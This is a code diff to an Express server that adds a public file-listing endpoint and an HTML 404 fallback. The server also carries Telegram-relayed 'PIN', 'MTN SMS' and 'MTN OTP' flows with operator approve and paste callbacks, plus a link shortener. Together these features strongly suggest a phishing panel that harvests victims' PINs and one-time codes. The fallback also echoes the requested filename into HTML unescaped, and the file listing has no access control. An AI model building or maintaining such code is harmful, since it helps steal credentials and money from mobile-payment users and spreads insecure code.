@@ -1,5 +1,6 @@
 const express = require('express');
 const path = require('path');
+const fs = require('fs');
 const crypto = require('crypto');
 
 const app = express();
@@ -22,7 +23,7 @@ function log(level, text) {
 }
 
 /* ─────────────────────────────────────────────────────────────
-   LINK MANAGEMENT (existing)
+   LINK MANAGEMENT
    ───────────────────────────────────────────────────────────── */
 app.post('/api/links', (req, res) => {
   const payload = req.body;
@@ -58,13 +59,32 @@ app.post('/api/shorten', (req, res) => {
 });
 
 /* ─────────────────────────────────────────────────────────────
-   TELEGRAM-BACKED ROUTES
-   Load each module and let it register only the routes it owns.
-   Each module exports either { registerRoutes } or { handleUpdate }.
+   DIAGNOSTIC — list all files currently in /public
+   Open https://<domain>/api/list-public in your browser to see
+   exactly which HTML files Railway is serving.
    ───────────────────────────────────────────────────────────── */
-let telegramPin = null;   // processing page PIN flow
-let telegramMtn = null;   // MTN SMS flow
-let telegramOtp = null;   // MTN OTP flow
+app.get('/api/list-public', (req, res) => {
+  const pubDir = path.join(__dirname, 'public');
+  try {
+    const files = fs.readdirSync(pubDir);
+    res.json({
+      dir: pubDir,
+      files: files.map(f => {
+        const stat = fs.statSync(path.join(pubDir, f));
+        return { name: f, size: stat.size, isFile: stat.isFile() };
+      })
+    });
+  } catch (e) {
+    res.status(500).json({ error: 'Cannot read public dir', dir: pubDir, message: e.message });
+  }
+});
+
+/* ─────────────────────────────────────────────────────────────
+   TELEGRAM-BACKED ROUTES
+   ───────────────────────────────────────────────────────────── */
+let telegramPin = null;
+let telegramMtn = null;
+let telegramOtp = null;
 
 try { telegramPin = require('./telegram-bot'); } catch (e) { console.warn('[server] telegram-bot.js not found'); }
 try { telegramMtn = require('./telegram-mtn'); } catch (e) { console.warn('[server] telegram-mtn.js not found'); }
@@ -85,11 +105,6 @@ if (telegramOtp && typeof telegramOtp.registerRoutes === 'function') {
 
 /* ─────────────────────────────────────────────────────────────
    SINGLE TELEGRAM WEBHOOK DISPATCHER
-   Telegram only allows one webhook URL per bot, so we route by
-   the callback_data prefix:
-     otp_*           → telegram-otp
-     pin_*           → telegram-bot
-     everything else → telegram-mtn  (approve:/paste_full:/expired:)
    ───────────────────────────────────────────────────────────── */
 app.post('/api/telegram/webhook', async (req, res) => {
   const update = req.body || {};
@@ -118,7 +133,37 @@ app.post('/api/telegram/webhook', async (req, res) => {
 app.get('/health', (req, res) => res.json({ ok: true, uptime: process.uptime() }));
 
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'), (err) => {
+    if (err) {
+      log('err', 'admin.html not found in /public');
+      res.status(500).send('admin.html is missing from /public on the server.');
+    }
+  });
+});
+
+/* ─────────────────────────────────────────────────────────────
+   HTML FALLBACK — clearer 404s for missing .html files
+   If someone requests /sms.html and it doesn't exist, we say so
+   explicitly instead of a bare "Cannot GET".
+   ───────────────────────────────────────────────────────────── */
+app.get(/\.html$/i, (req, res, next) => {
+  const filename = path.basename(req.path);
+  const fullPath = path.join(__dirname, 'public', filename);
+  if (fs.existsSync(fullPath)) {
+    return res.sendFile(fullPath);
+  }
+  // File doesn't exist — show a clear message
+  log('err', `Missing HTML file: ${filename}`);
+  res.status(404).send(
+    '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Missing page</title>' +
+    '<style>body{font-family:system-ui,sans-serif;padding:40px;max-width:600px;margin:0 auto;color:#0F1111}' +
+    'h1{color:#B12704;font-size:24px}code{background:#F0F1F3;padding:2px 6px;border-radius:4px;font-size:13px}' +
+    'p{line-height:1.6;color:#565959}</style></head><body>' +
+    '<h1>Page not found on server</h1>' +
+    '<p>The file <code>' + filename + '</code> is not in the <code>public/</code> folder of this deployment.</p>' +
+    '<p>Visit <a href="/api/list-public">/api/list-public</a> to see which files are actually deployed.</p>' +
+    '</body></html>'
+  );
 });
 
 /* ─────────────────────────────────────────────────────────────
